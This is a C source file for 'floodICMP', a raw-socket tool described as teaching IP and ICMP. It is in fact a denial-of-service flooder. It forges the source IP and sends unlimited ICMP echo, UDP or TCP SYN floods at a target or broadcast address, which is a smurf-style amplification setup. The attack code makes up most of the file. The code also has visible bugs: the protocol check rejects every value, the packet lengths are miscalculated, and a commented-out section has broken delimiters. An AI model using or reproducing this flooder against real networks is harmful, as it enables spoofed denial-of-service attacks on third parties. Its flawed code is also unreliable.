/***************************************************/
/* floodICMP is created to understand how works    */
/* IP and ICMP protocols. It send a modify datagram*/
/* to a broadcast address. Use an analyser like    */
/* wireshark to understand the operation.	   */
/*						   */
/* Compilation : gcc -o floodICMP floodicmp.c	   */
/* Run with root privilege : 			   */
/* ./floodICMP 192.168.12.15 192.168.12.5 15000	   */
/* Contact : ride_online@hotmail.fr		   */
/***************************************************/

#include <sys/socket.h>
#include <arpa/inet.h>	// htons, inet_addr ...
#include <linux/ip.h>   // IP header
#include <linux/icmp.h>	  // ICMP header
#include <linux/udp.h>	  // UDP header
#include <linux/tcp.h>	  // TCP header
#include <stdio.h>   // perror, printf
#include <stdlib.h>   // Flags, exit
#include <string.h>	// memset, memcpy
#include <unistd.h>	// close, getuid, getopt
#include <errno.h>

struct icmphdr *icmp;
struct tcphdr *tcp;
struct udphdr *udp;

/* Calculates the checksum of the ip header.*/
unsigned short csum(unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
    return(answer);
}

/* Print usage */
void usage()
{
	printf("Usage : ./floodit -t {tcp | udp | icmp} -s <spoofed_ip> [OPTIONS] <ip_target>\n\n");
	printf("  OPTIONS :\n\t\t-q level : select the speed level 1, 2 or 3, (DEFAULT 1)\n");
	printf("\t\t-n number : specifies the number of packet send or 0 for an unlimited flood, (DEFAULT 0)\n");
	printf("\t\t-p port : specifies the destination port, (DEFAULT 80)\n");
	printf("\t\t-s spoofed_ip : specifies the spoofed IP address\n");
	printf("\t\t-h, --help : print the help !\n\n");

	printf("Example : ./floodit -t icmp -q 2 -n 0 -s 192.168.12.5 192.168.12.15\n");
}

/* Send UDP or ICMP packet */
void sendflood_to(int sock, const char *packet, struct sockaddr_in *dest)
{
	if(sendto(sock, packet, sizeof(packet)*strlen(packet), 0, (struct sockaddr *) dest, sizeof(*dest)) == -1) {
		perror("sendto()");
		exit(EXIT_FAILURE);
	}
}


/* Send TCP packet */
void sendflood(int sock, char *packet)
{
	if(send(sock, packet, sizeof(packet), 0) == -1) {
		perror("send()");
		exit(EXIT_FAILURE);
	}
}

/* Fill the IP header */
void ip_header(struct iphdr *ip, int packet_size, int proto, const char *saddr, const char *daddr)
{
	ip->version = IPVERSION;
	ip->ihl = 5;
	ip->tos = IPTOS_LOWDELAY;
	ip->tot_len = packet_size;
	ip->id = rand();
	ip->frag_off = 0;
	ip->ttl = MAXTTL;
	ip->protocol = proto;
	ip->check = 0;	// initialize to 0
	ip->saddr = inet_addr(saddr);	// Target
	ip->daddr = inet_addr(daddr);	// IP Broadcast
}

/* Fill the ICMP header */
void icmp_header()
{
	icmp->type = ICMP_ECHO; // ECHO REQUEST
	icmp->code = 0; // DEFAULT VALUE
	icmp->checksum = 0;
	icmp->un.echo.id = rand();
	icmp->un.echo.sequence = rand();
}

void tcp_header(int port_dst)
{
	// Fill the TCP header
	while(tcp->source = rand(), (tcp->source < 1024) && (tcp->source > 65535));
	tcp->dest = htons(port_dst);
	tcp->seq = 0;
	tcp->ack_seq = 0;
	tcp->doff = 0;
	tcp->res1 = 0;
	tcp->cwr = 0;
	tcp->ece = 0;
	tcp->urg = 0;
	tcp->ack = 0;
	tcp->psh = 0;
	tcp->rst = 0;
	tcp->syn = 1;
	tcp->fin = 0;
	tcp->window = 0;
	tcp->check = 0;
	tcp->urg_ptr = 0;
}

void udp_header(int port_dst)
{
	// Fill the UDP header
	while(udp->source = rand(), (udp->source < 1024) && (udp->source ) > 65535 );
	udp->dest = htons(port_dst);
	udp->len = 16;
	udp->check = 0;
}

/* Init raw socket for flood ICMP */
int init_raw_connection(struct iphdr *ip, struct sockaddr_in *dest_addr, const char *payload,
				 const char *target, const char *ip_dest, const char *packet, const char *proto, int port)
{
	int sock;
	int sockopt = 1;	// Socket option : 1 = broadcast enable & IP HDR provide

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	if(sock == -1) {
		perror("socket()");
		exit(EXIT_FAILURE);
	}

	// IP Header provide
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &sockopt, sizeof(sockopt)) == -1) {
		perror("setsockopt()");
		exit(EXIT_FAILURE);
	}

	// Enable Broadcast
	if(setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &sockopt, sizeof(sockopt)) == -1) {
		perror("setockopt()");
		exit(EXIT_FAILURE);
	}

	// Mounts the packet headers
	icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
	ip = (struct iphdr *) packet;


	if(strncmp(proto, "icmp", 4) == 0) {
		// Fill the IP header
		ip_header(ip, sizeof(packet)*strlen(packet), 1, target, ip_dest);

		printf("Flood ICMP\n");
		icmp = malloc(sizeof(struct icmphdr));
	
		//Fill the ICMP header
		icmp_header();
	}
	else if(strncmp(proto, "tcp", 3) == 0) {
		// Fill the IP header
		ip_header(ip, sizeof(packet)*strlen(packet), 6, target, ip_dest);

		printf("Flood TCP\n");
		tcp = malloc(sizeof(struct tcphdr));

		// Fill the TCP header
		tcp_header(port);
	}
	else {
		// Fill the IP header
		ip_header(ip, sizeof(packet)*strlen(packet), 17, target, ip_dest);

		printf("Flood UDP\n");
		udp = malloc(sizeof(struct udphdr));

		// Fill the UDP header
		udp_header(port);
	}

	// Include a small welcoming message !!
//	memcpy(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), payload, strlen(payload));

	// Interface dest
	dest_addr->sin_family = AF_INET;
	dest_addr->sin_addr.s_addr = inet_addr(ip_dest);
	if(strncmp(proto, "icmp", 4) != 0)
		dest_addr->sin_port = htons(port);

	return sock;	
}

/* Init tcp socket for flood TCP /
int init_tcp_connection(struct iphdr *ip, struct tcphdr *tcp, struct sockaddr_in *dest,
					char *target, char *bad_ip, int port_dest, char *packet)
{
	int sockopt = 1;
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	if(sock == -1) {
		perror("socket()");
		exit(EXIT_FAILURE);
	}

	// IP Header provide
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &sockopt, sizeof(sockopt)) == -1) {
		perror("setsockopt()");
		exit(EXIT_FAILURE);
	}

	// Mounts the packet headersw
	tcp = (struct tcphdr *) (packet + sizeof(struct iphdr));
	ip = (struct iphdr *) packet;

	// Fill the IP header
	ip_header(ip, 6, sizeof(packet), bad_ip, target);

	// Fill the TCP header
	while(tcp->source = rand(), (tcp->source < 1024) && (tcp->source > 65535));
	tcp->dest = htons(port_dest);
	tcp->seq = 0;
	tcp->ack_seq = 0;
	tcp->doff = 0;
	tcp->res1 = 0;
	tcp->cwr = 0;
	tcp->ece = 0;
	tcp->urg = 0;
	tcp->ack = 0;
	tcp->psh = 0;
	tcp->rst = 0;
	tcp->syn = 1;
	tcp->fin = 0;
	tcp->window = 0;
	tcp->check = 0;
	tcp->urg_ptr = 0;

	dest->sin_family = AF_INET;
	dest->sin_port = htons(port_dest);
	dest->sin_addr.s_addr = inet_addr(target);

	if(connect(sock, (struct sockaddr *) dest, sizeof(dest)) == -1) {
		perror("connect()");
		exit(EXIT_FAILURE);
	}

	return sock;
}

/ Init udp socket for flood UDP /
int init_udp_connection(struct iphdr *ip, struct udphdr *udp, struct sockaddr_in *dest, 
					char *target, char *bad_ip, int port_dest, char *packet)
{
	int sockopt = 1;
	int sock = socket(AF_INET, SOCK_DGRAM, 0);

	if(sock == -1) {
		perror("socket()");
		exit(EXIT_FAILURE);
	}
	
	// IP Header provide
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &sockopt, sizeof(sockopt)) == -1) {
		perror("setsockopt()");
		exit(EXIT_FAILURE);
	}

	// Mounts the packet headers
	udp = (struct udphdr *) (packet + sizeof(struct iphdr));
	ip = (struct iphdr *) packet;

	// Fill the IP header
	ip_header(ip, 17, sizeof(packet), bad_ip, target);

	// Fill the UDP header
	while(udp->source = rand(), (udp->source < 1024) && (udp->source ) > 65535 );
	udp->dest = htons(port_dest);
	udp->len = 16;
	udp->check = 0;

	dest->sin_family = AF_INET;
	dest->sin_port = htons(port_dest);
	dest->sin_addr.s_addr = inet_addr(target);

	return sock;	
}
*/
int main(int argc, char **argv)
{
	struct iphdr *ip;	// Header IP
	struct icmphdr *icmp;	// Header ICMP
	struct tcphdr *tcp;	// Header TCP
	struct udphdr *udp;	// Header UDP
	struct sockaddr_in dest_addr;	// Interface dest
	int sock;
	int ch;
	const char *payload = "Hello :)";	// Short msg inside
	char packet[sizeof(struct iphdr) + sizeof(struct icmphdr) + sizeof(char)*strlen(payload)];	// Packet to send
	unsigned int i = 0;
	char *proto = NULL;
	char *ipaddr_spoofed = NULL;
	unsigned int port = 80, speed = 1, nbpacket = 0; // Options by default
	

	if(getuid() != 0) {
		printf("You must be root to run floodICMP\n");
		exit(EXIT_FAILURE);
	}

	if(argc == 1) {
		usage();
		exit(EXIT_FAILURE);
	}

	while((ch = getopt(argc, argv, "t:q:n:s:p:h")) != -1 ) {
		switch(ch) {
			case 't':
				if(strncmp(optarg, "icmp", 4) != 0 || strncmp(optarg, "tcp", 3) != 0 || strncmp(optarg, "udp", 3) != 0) {
					printf("Error with option -t (Only the values icmp, tcp or udp are available\n");
					exit(EXIT_FAILURE);
				}
				
				proto = optarg;
				break;
			case 'q':
				speed = atoi(optarg);
				if(speed > 3 && speed < 1) {
					printf("Error with option -q (Must be between 1 and 3)\n");
					exit(EXIT_FAILURE);
				}
				break;
			case 'n':
				nbpacket = atoi(optarg);
				break;
			case 's':
				ipaddr_spoofed = optarg;
				break;
			case 'p':
				port = atoi(optarg);
				break;
			case 'h':
				usage();
				break;
			case '?':
				usage();
				break;
		}
	}

	if(proto == NULL || ipaddr_spoofed == NULL) {
		printf("Option -t and -s are missing\t --\tUse -h to get some help\n");
		exit(EXIT_FAILURE);
	}

	printf("+---------------------------------------+\n");
	printf("| Dst addr : %s\t\t\t|\n", argv[argc - 1]);
	printf("| Src addr : %s \t\t\t|\n", ipaddr_spoofed);
	if(strstr(proto,"icmp") == NULL)
		printf("| Port : %d\t\t\t|\n", port);
	printf("| Nb packet : %d\t\t\t|\n", nbpacket);
	printf("| Speed : %d\t\t\t\t|\n", speed);
	printf("+---------------------------------------+\n\n");


	// Allocate memory
	ip = malloc(sizeof(struct iphdr));

	// Init the different header	
	sock = init_raw_connection(ip, &dest_addr, payload, ipaddr_spoofed, argv[argc - 1], packet, proto, port);

	if(nbpacket == 0) while(1) {
			// Calculate checksums
			ip->check = csum((unsigned short *)packet, ip->tot_len);
			if(strstr(proto,"icmp"))
				icmp->checksum = csum((unsigned short *) icmp,  sizeof(struct icmphdr) + strlen(payload));
		/*	else if(strstr(proto,"udp"))
				udp->check = csum((unsigned short *) udp,  sizeof(struct udphdr));
			else
				tcp->check = csum((unsigned short *) tcp,  sizeof(struct tcphdr));
		*/
			// Send packets
			if(strstr(proto,"icmp") || strstr(proto,"udp"))
				sendflood_to(sock, packet, &dest_addr);
		/*	else
				sendflood(sock, packet);
		*/	
			printf(".");
			sleep(speed - 1);
			i++;
		}
	else	for(i = 0 ; i < nbpacket ; i++) {
			// Calculate checksums
			ip->check = csum((unsigned short *)packet, ip->tot_len);
			icmp->checksum = csum((unsigned short *) icmp,  sizeof(struct icmphdr) + strlen(payload));
			if(strstr(proto,"icmp"))
				icmp->checksum = csum((unsigned short *) icmp,  sizeof(struct icmphdr) + strlen(payload));
		/*	else if(strstr(proto,"udp"))
				udp->check = csum((unsigned short *) udp,  sizeof(struct udphdr));
			else
				tcp->check = csum((unsigned short *) tcp,  sizeof(struct tcphdr));
		*/
			// Send packets
			if(strstr(proto,"icmp") || strstr(proto,"udp"))
				sendflood_to(sock, packet, &dest_addr);
		/*	else
				sendflood(sock, packet);
		*/
			printf(".");
			sleep(speed - 1);
		}

	printf("\nDone : %d packets send !\n", i);

	close(sock);	// Close socket

	return EXIT_SUCCESS;
}
